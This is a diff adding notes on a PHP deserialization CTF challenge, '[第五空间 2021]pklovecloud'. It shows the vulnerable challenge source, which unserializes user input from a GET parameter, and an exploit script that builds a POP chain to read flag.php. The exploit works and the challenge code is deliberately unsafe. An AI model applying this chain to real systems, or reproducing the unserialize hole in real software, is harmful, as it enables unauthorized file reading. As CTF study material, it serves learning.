@@ -97,6 +97,104 @@ for($k=1;$k<=sizeof($payload);$k++){
 
 
 
+# php 反序列化
+## [第五空间 2021]pklovecloud
+```php
+<?php
+//include 'flag.php';
+class pkshow
+{
+    function echo_name()
+    {
+        return "Pk very safe^.^";
+    }
+}
+
+class acp
+{
+    protected $cinder;
+    public $neutron;
+    public $nova;
+    function __construct()
+    {
+        $this->cinder = new pkshow;
+    }
+    function __toString()
+    {
+        if (isset($this->cinder))
+            return $this->cinder->echo_name();
+    }
+}
+
+class ace
+{
+    public $filename;
+    public $openstack;
+    public $docker;
+    function echo_name()
+    {
+        $this->openstack = unserialize($this->docker);
+        $this->openstack->neutron = $heat;
+        if($this->openstack->neutron === $this->openstack->nova)
+        {
+            $file = "./{$this->filename}";
+            if (file_get_contents($file))
+            {
+                return file_get_contents($file);
+            }
+            else
+            {
+                return "keystone lost~";
+            }
+        }
+    }
+}
+
+if (isset($_GET['pks']))
+{
+    $logData = unserialize($_GET['pks']);
+    echo $logData;
+}
+else
+{
+    highlight_file(__file__);
+}
+?>
+```
+
+exp
+
+```php
+<?php
+
+class acp
+{
+    protected $cinder;
+    public $neutron;
+    public $nova;
+    function __construct($cinder){
+        $this->nova = &$this->neutron;
+        $this->cinder = $cinder;
+    }
+}
+
+class ace
+{
+    public $filename = "flag.php";
+    public $docker;
+    function __construct($docker){
+        $this->docker = $docker;
+    }
+}
+
+echo urlencode(serialize(new acp(new ace(serialize(new acp(""))))));
+
+//$b = serialize(new acp(""));
+//$c = new ace($b);
+//$d = new acp($c);
+//echo urlencode(serialize($d));
+```
+## NSSCTF prize
 # SSTI
 
 ## SSTI | 入门 | [FBCTF2019]Event
